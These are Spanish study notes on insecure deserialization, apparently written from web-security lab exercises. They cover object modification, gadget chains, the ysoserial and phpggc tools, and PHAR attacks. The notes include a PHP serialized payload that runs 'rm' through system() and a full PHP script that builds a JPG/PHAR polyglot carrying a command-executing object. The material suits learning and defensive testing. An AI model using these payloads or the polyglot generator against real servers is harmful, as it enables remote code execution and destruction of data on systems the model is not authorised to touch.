
------------
# Definición

>**Insecure deserialization** (deserialización insegura) es una vulnerabilidad que ocurre cuando una aplicación **acepta y procesa datos serializados sin validarlos ni controlarlos adecuadamente**.

Cuando estos datos provienen de fuentes no confiables (por ejemplo, un usuario o una petición externa), un atacante puede **modificar el contenido serializado** para ejecutar acciones maliciosas, como:

- Ejecutar código arbitrario
    
- Escalar privilegios
    
- Manipular lógica interna de la aplicación
    
- Obtener acceso a información sensible
    

Esto sucede porque la deserialización reconstruye objetos completos en memoria, y si el proceso no impone restricciones, un atacante puede inyectar objetos o estructuras que provoquen comportamientos peligrosos.

----------
# Modify serialized objects

Si se controla el input de un objeto serializado, puede modificarse para efectuar acciones no deseadas en el servidor.

Dependiendo del lenguaje, será más o menos costoso modificarlo. Por ejemplo, en php, los objetos serializados se guardan en cadenas de texto legibles y es sencillo entenderlo y modificarlo.
``` php example
O:14:"CustomTemplate":2:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:6:"system";}}
```

En cambio, en otros lenguajes puede ser más tedioso. Como en java, que el objeto se guarda en binario.

\*Nota: Contenido del objeto serializado java convertido a base64.
``` java example
rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAGCcgcG9sbGV0ZSBzaSBsbyBsZWVzLS0gLQ==
```

---------
# Arbitrary object injection

Además de modificar el objeto serializado, se puede enviar a la aplicación un objeto arbitrario serializado. Esto permite más flexibilidad para realizar el ataque y puede aumentar considerablemente el alcance de este.

Sin embargo, es necesario que exista la clase del objeto serializado en el servidor, además de algunos *métodos mágicos* que, concatenados, permitan ejecutar acciones no deseadas en el momento de deserialización del objeto.

*\*Nota*: Los **métodos mágicos** son unas funciones que se lanzan cuando sucede cierto evento. Por ejemplo, en php, el método `__wakeup()` se lanza cuando un objeto de esa clase se deserializa. O `__toString()`, cuando se intenta tratar al objeto como una cadena de texto, tanto para concatenar como para imprimir por pantalla.

## Pre-built gadget chains

Un enfoque para explotar la deserialización insegura es probar con algún gadget chain ya elaborado de alguna librería/framework conocido que pueda estar utilizando el servidor.

Para ello, se pueden utilizar herramientas que generan el payload directamente según el lenguaje y la librería/framework.

### Javascript

La herramienta `ysoserial` permite crear objetos serializados para una variedad de librerías de java, como `Apache Commons Collections`.

### PHP

Por otro lado, en php se puede emplear `phpggc` para generar un gadget chain genérico, según framework y versión que se elija.

## Documented gadget chains

No siempre existe una herramienta dedicada para explotar deserialización insegura en el framework exacto que usa el servidor. Sin embargo, puede que exista un gadget chain documentado en internet para la versión de framework utilizado.

## Custom gadget chains

Esta otra variante *requiere acceso al código* fuente del servidor. Se basa en buscar una secuencia de llamadas a métodos dentro del código de la web para que, al momento de deserializar el objeto, se ejecuten acciones privilegiadas o, en ocasiones, ejecución remota de comandos.

Es necesario analizar el código y entender el funcionamiento específico de la aplicación, por lo que no se puede explotar de manera genérica en cualquier servidor.

----------
# PHAR deserialization

Otro vector de ataque para deserialización insegura es a través de un archivo `PHAR`. Solo afecta a *aplicaciones basadas en php*.

Se basa en la utilización del wrapper `phar://` para acceder a archivos del servidor a través de alguna funcionalidad del mismo.

En los archivos ``PHAR``, los manifest files incluyen metadata serializada. Cuando se realiza cualquier acción sobre el archivo ``PHAR`` con el wrapper `phar://`, estos metadatos son deserializados implícitamente.

Esta técnica requiere, obviamente, subir el archivo malicioso al servidor. Lo más probable es que sea bloqueado con cualquier tipo de subida, por lo que se puede tratar de crear un *archivo políglota*, como un jpg-phar-Polyglot (jpg y phar en el mismo archivo). El servidor creerá que es un archivo de imagen, ya que lo intentará tratar así (con éxito). Sin embargo, al acceder a él con `phar://` se desencadenará la deserialización de los objetos, sin importar la extensión del archivo.

Script para crear archivo políglota:
``` php
<?php


function generate_base_phar($o, $prefix){
    global $tempname;
    @unlink($tempname);
    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->addFromString("test.txt", "test");
    $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($o);
    $phar->stopBuffering();
    
    $basecontent = file_get_contents($tempname);
    @unlink($tempname);
    return $basecontent;
}

function generate_polyglot($phar, $jpeg){
    $phar = substr($phar, 6); // remove <?php dosent work with prefix
    $len = strlen($phar) + 2; // fixed 
    $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
    $contents = substr($new, 0, 148) . "        " . substr($new, 156);

    // calc tar checksum
    $chksum = 0;
    for ($i=0; $i<512; $i++){
        $chksum += ord(substr($contents, $i, 1));
    }
    // embed checksum
    $oct = sprintf("%07o", $chksum);
    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
    return $contents;
}


// pop exploit class
class PHPObjectInjection {}
$object = new PHPObjectInjection;
$object->inject = 'system("id");';
$object->out = 'Hallo World';



// config for jpg
$tempname = 'temp.tar.phar'; // make it tar
$jpeg = file_get_contents('in.jpg');
$outfile = 'out.jpg';
$payload = $object;
$prefix = '';

var_dump(serialize($object));


// make jpg
file_put_contents($outfile, generate_polyglot(generate_base_phar($payload, $prefix), $jpeg));

/*
// config for gif
$prefix = "\x47\x49\x46\x38\x39\x61" . "\x2c\x01\x2c\x01"; // gif header, size 300 x 300
$tempname = 'temp.phar'; // make it phar
$outfile = 'out.gif';

// make gif
file_put_contents($outfile, generate_base_phar($payload, $prefix));

*/
```

*\*Nota*: modificar **//pop exploit class** con las clases necesarias para el exploit, y **//config for jpg** con los valores correctos de imagen input y output.